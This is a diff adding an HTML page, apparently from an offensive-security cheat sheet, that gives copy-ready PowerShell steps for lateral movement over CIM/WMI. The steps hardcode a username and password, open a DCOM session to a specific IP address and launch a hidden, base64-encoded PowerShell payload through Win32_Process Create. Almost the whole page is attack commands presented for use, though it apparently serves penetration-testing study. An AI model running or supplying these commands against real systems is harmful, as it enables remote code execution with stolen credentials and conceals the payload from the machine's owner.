@@ -1,0 +1,99 @@
+<section class="page active prose-page">
+  <h1>Common Information Model (CIM)</h1>
+
+  <p class="intro">
+    Common Information Model (CIM) is Microsoft's modern implementation for managing Windows systems through Windows
+    Management Instrumentation (WMI). CIM provides a standardized object-based interface to query system information,
+    manage Windows components, and execute remote operations. It is primarily accessed through PowerShell CIM cmdlets
+    (e.g., Get-CimInstance, Invoke-CimMethod, New-CimSession) and supports communication over WS-Man (WinRM) by default
+    or DCOM/RPC for compatibility with legacy environments.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Execute Payload On The Target</h2>
+    <span></span>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Define User Credentials</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$username = 'jen';</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$password = 'Nexus123!';</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Convert Password To SecureString</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Create PSCredential Object</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Configure CIM Session (DCOM)</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$Options = New-CimSessionOption -Protocol DCOM</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Create Remote CIM Session</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$Session = New-Cimsession -ComputerName 192.168.218.72 -Credential $credential -SessionOption $Options</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Define Command To Execute</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">$Command = 'powershell -nop -w hidden -e  &lt;base64 payload&gt;';</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+
+  <div class="section-title section-title-sub">
+    <span></span>
+    <h2>Execute Remote Process Via WMI</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
